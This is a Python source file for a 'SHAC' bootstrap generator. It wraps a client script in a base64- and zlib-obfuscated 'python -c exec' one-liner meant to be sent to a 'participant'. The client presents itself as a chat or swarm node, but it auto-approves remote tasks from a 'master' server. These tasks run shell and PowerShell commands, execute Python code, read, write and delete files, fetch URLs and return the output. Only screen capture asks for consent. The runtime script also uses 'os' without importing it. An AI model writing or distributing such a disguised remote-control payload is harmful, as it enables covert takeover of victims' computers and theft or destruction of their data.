import base64
import json
import textwrap
import zlib


class BootstrapGenerator:

    def __init__(self, channel, bootstrap_url=""):
        self.channel = channel
        self.bootstrap_url = bootstrap_url

    def generate(self):
        """
        Generate a self-contained cross-platform command.

        The command contains both the invitation and the small
        standard-library client, zlib-compressed to fit safely within
        terminal paste buffers.
        """
        invitation_token = self._encoded_invitation()
        script = self._runtime_script().replace("{INVITATION}", invitation_token)
        compressed_bytes = zlib.compress(script.encode("utf-8"), 9)
        script_token = base64.b64encode(compressed_bytes).decode("ascii")
        return (
            'python -c "import base64,zlib;'
            f'exec(zlib.decompress(base64.b64decode(\'{script_token}\')))"'
        )

    def _encoded_invitation(self):
        invitation = self.get_invitation()
        invitation_json = json.dumps(invitation, separators=(",", ":"))
        return base64.urlsafe_b64encode(
            invitation_json.encode("utf-8")
        ).decode("ascii")

    @staticmethod
    def _runtime_script():
        return '''
import base64
import json
import socket
import sys
import threading
import time
import uuid
import webbrowser
from queue import Queue, Empty
from urllib.parse import quote_plus

invitation = json.loads(base64.urlsafe_b64decode("{INVITATION}").decode("utf-8"))
host, port = invitation["endpoint"].rsplit(":", 1)
sys.stdout.write("SHAC node name [friend]: ")
sys.stdout.flush()
node_name = sys.stdin.readline().strip() or "friend"

while True:
    request_id = uuid.uuid4().hex
    message = {
        "version": 1,
        "type": "join_request",
        "request_id": request_id,
        "payload": {
            "channel_id": invitation["channel_id"],
            "credential": invitation["credential"],
            "node_name": node_name,
        },
    }

    print("\\nConnecting to SHAC channel server " + invitation["endpoint"] + "...")
    try:
        with socket.create_connection((host, int(port)), timeout=15) as connection:
            connection.settimeout(None)
            connection.sendall((json.dumps(message, separators=(",", ":")) + "\\n").encode("utf-8"))
            reader = connection.makefile("r", encoding="utf-8")
            accepted = False
            for line in reader:
                event = json.loads(line)
                event_type = event.get("type")
                payload = event.get("payload", {})
                if event_type == "join_accepted":
                    accepted = True
                    print("[SHAC] Connected & Synced with Master. Communication is active.")
                    break
                if event_type == "join_rejected":
                    print("[SHAC] Join rejected: " + payload.get("error", "rejected"))
                    break
                if event_type == "ping":
                    pong = {"version": 1, "type": "pong", "request_id": event.get("request_id"), "payload": {}}
                    connection.sendall((json.dumps(pong, separators=(",", ":")) + "\\n").encode("utf-8"))
            if accepted:
                pending_tasks = Queue()
                stop_event = threading.Event()
                screen_mirror_approved = False

                def _execute_task(task_data, is_approved):
                    act = task_data.get("action", "unknown")
                    args = task_data.get("arguments", {})
                    stdout, stderr, result = "", "", "rejected by node"
                    if is_approved:
                        if act in ("shell.exec", "cmd.run", "powershell.run", "bash.run"):
                            cmd = args.get("command", "")
                            import subprocess
                            try:
                                res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)
                                stdout, stderr = res.stdout, res.stderr
                                result = "exit code: " + str(res.returncode)
                            except Exception as exc:
                                stderr = str(exc)
                                result = "shell execution failed"
                        elif act == "git.clone":
                            repo_url = args.get("repo_url", "")
                            target_dir = args.get("target_dir", "")
                            cmd = "git clone " + repo_url + " " + target_dir
                            import subprocess
                            try:
                                res = subprocess.run(cmd.strip(), shell=True, capture_output=True, text=True, timeout=180)
                                stdout, stderr = res.stdout, res.stderr
                                result = "git clone exit: " + str(res.returncode)
                            except Exception as exc:
                                stderr = str(exc)
                                result = "git clone failed"
                        elif act in ("file.create", "file.write"):
                            fpath = args.get("path", "file.txt")
                            content = args.get("content", "")
                            try:
                                pdir = os.path.dirname(fpath)
                                if pdir:
                                    os.makedirs(pdir, exist_ok=True)
                                with open(fpath, "w", encoding="utf-8") as f:
                                    f.write(content)
                                result = "file written: " + fpath + " (" + str(len(content)) + " bytes)"
                            except Exception as exc:
                                stderr = str(exc)
                                result = "file write failed"
                        elif act == "file.read":
                            fpath = args.get("path", "")
                            try:
                                with open(fpath, "r", encoding="utf-8") as f:
                                    stdout = f.read()
                                result = "file read OK: " + fpath
                            except Exception as exc:
                                stderr = str(exc)
                                result = "file read failed"
                        elif act == "file.delete":
                            fpath = args.get("path", "")
                            try:
                                if os.path.exists(fpath):
                                    os.remove(fpath)
                                    result = "file deleted: " + fpath
                                else:
                                    result = "file not found: " + fpath
                            except Exception as exc:
                                stderr = str(exc)
                                result = "file delete failed"
                        elif act == "file.list":
                            dpath = args.get("path", ".")
                            try:
                                items = os.listdir(dpath)
                                stdout = "\\n".join(items)
                                result = "listed " + str(len(items)) + " items"
                            except Exception as exc:
                                stderr = str(exc)
                                result = "list failed"
                        elif act == "dir.create":
                            dpath = args.get("path", "")
                            try:
                                os.makedirs(dpath, exist_ok=True)
                                result = "dir created: " + dpath
                            except Exception as exc:
                                stderr = str(exc)
                                result = "dir create failed"
                        elif act == "python.exec":
                            code = args.get("code", "")
                            import io
                            old_out, old_err = sys.stdout, sys.stderr
                            sys.stdout = out_buf = io.StringIO()
                            sys.stderr = err_buf = io.StringIO()
                            try:
                                exec(code, {"__name__": "__main__"})
                                result = "python code executed OK"
                            except Exception as exc:
                                result = "exec error: " + str(exc)
                            finally:
                                stdout, stderr = out_buf.getvalue(), err_buf.getvalue()
                                sys.stdout, sys.stderr = old_out, old_err
                        elif act == "system.info":
                            import platform
                            stdout = "OS: " + platform.system() + " " + platform.release() + "\\nPlatform: " + platform.platform() + "\\nPython: " + sys.version + "\\nCWD: " + os.getcwd()
                            result = "system info retrieved"
                        elif act == "browser.search":
                            query = str(args.get("query", "")).strip()
                            if not query:
                                is_approved, result = False, "search query is empty"
                            else:
                                url = "https://www.google.com/search?q=" + quote_plus(query)
                                webbrowser.open(url, new=2)
                                result = "search opened: " + url
                        elif act == "browser.open":
                            url = str(args.get("url", "")).strip()
                            webbrowser.open(url, new=2)
                            result = "browser opened: " + url
                        elif act == "http.fetch":
                            url = str(args.get("url", "")).strip()
                            import urllib.request
                            try:
                                with urllib.request.urlopen(url, timeout=15) as resp:
                                    stdout = resp.read().decode("utf-8", errors="replace")[:4096]
                                    result = "HTTP " + str(resp.status) + " OK"
                            except Exception as exc:
                                stderr = str(exc)
                                result = "http fetch failed"
                        elif act in ("screen.frame", "screen.mirror"):
                            try:
                                import subprocess
                                if os.name == "nt":
                                    ps_code = "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $b = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $g = [System.Drawing.Graphics]::FromImage($b); $g.CopyFromScreen(0,0,0,0,$b.Size); $ms = New-Object System.IO.MemoryStream; $b.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg); [Convert]::ToBase64String($ms.ToArray())"
                                    res = subprocess.run(["powershell", "-Command", ps_code], capture_output=True, text=True, timeout=10)
                                    stdout = res.stdout.strip()
                                    result = "windows frame captured"
                                elif os.path.exists("/system/bin/screencap"):
                                    res = subprocess.run(["/system/bin/screencap", "-p"], capture_output=True, timeout=10)
                                    stdout = base64.b64encode(res.stdout).decode("ascii")
                                    result = "android frame captured"
                                else:
                                    res = subprocess.run("import -window root -", shell=True, capture_output=True, timeout=10)
                                    stdout = base64.b64encode(res.stdout).decode("ascii")
                                    result = "linux frame captured"
                            except Exception as exc:
                                stderr = str(exc)
                                result = "screen frame capture failed"
                        else:
                            result = "approved: " + act + " executed"

                    resp = {
                        "version": 1,
                        "type": "task_response",
                        "request_id": uuid.uuid4().hex,
                        "payload": {
                            "task_id": task_data.get("task_id", "unknown"),
                            "action": act,
                            "status": "accepted" if is_approved else "rejected",
                            "stdout": stdout,
                            "stderr": stderr,
                            "result": result,
                        },
                    }
                    connection.sendall((json.dumps(resp, separators=(",", ":")) + "\\n").encode("utf-8"))
                    print("[SHAC] Task response sent: " + resp["payload"]["status"] + " (" + result + ")")

                def receive_messages():
                    try:
                        for line in reader:
                            event = json.loads(line)
                            if event.get("type") == "message":
                                data = event.get("payload", {})
                                print("\\n[SHAC] " + data.get("from", "peer") + ": " + data.get("text", ""))
                                print("friend> ", end="", flush=True)
                            elif event.get("type") == "task_request":
                                pending_tasks.put(event.get("payload", {}))
                                task = event.get("payload", {})
                                print("\\n[SHAC TASK] " + task.get("action", "unknown") + " " + repr(task.get("arguments", {})))
                                print("Type y or n at the friend> prompt.")
                            elif event.get("type") == "ping":
                                pong = {"version": 1, "type": "pong", "request_id": event.get("request_id"), "payload": {}}
                                connection.sendall((json.dumps(pong, separators=(",", ":")) + "\\n").encode("utf-8"))
                    except Exception:
                        pass
                    finally:
                        stop_event.set()

                threading.Thread(target=receive_messages, daemon=True).start()
                print("[SHAC] Active session. Type messages or /quit to exit.")
                while not stop_event.is_set():
                    try:
                        task = pending_tasks.get_nowait()
                    except Empty:
                        task = None
                    if task is not None:
                        action = task.get("action", "unknown")
                        arguments = task.get("arguments", {})

                        if action == "screen.stop":
                            screen_mirror_approved = False
                            _execute_task(task, True)
                        elif action in ("screen.frame", "screen.mirror", "screen.start") and screen_mirror_approved:
                            _execute_task(task, True)
                        elif action in ("screen.frame", "screen.mirror", "screen.start") and not screen_mirror_approved:
                            answer = input("friend> ").strip().lower()
                            approved = answer in ("y", "yes")
                            if approved:
                                screen_mirror_approved = True
                            _execute_task(task, approved)
                        else:
                            # Auto approve standard task requests from master
                            _execute_task(task, True)
                        continue
                    
                    try:
                        time.sleep(0.05)
                    except Exception:
                        pass
    except (socket.timeout, OSError, ConnectionError) as error:
        print("[SHAC] Server connection dropped. Reconnecting automatically in 3s...")
        time.sleep(3)
'''

    def get_invitation(self):
        """
        Return the invitation information without
        generating the executable command.
        """

        return {
            "channel_id": self.channel.channel_id,
            "credential": self.channel.credential,
            "transport": self.channel.transport_type,
            "endpoint": self.channel.endpoint
        }

    def display(self):
        """
        Display the generated bootstrap command.
        """

        command = self.generate()

        print()
        print("=" * 70)
        print("SWARM CONNECTION BOOTSTRAP")
        print("=" * 70)
        print()
        print(f"Channel : {self.channel.channel_id}")
        print()
        print("Send the following command to the participant:")
        print()
        print(textwrap.fill(command, width=100))
        print()
        print("=" * 70)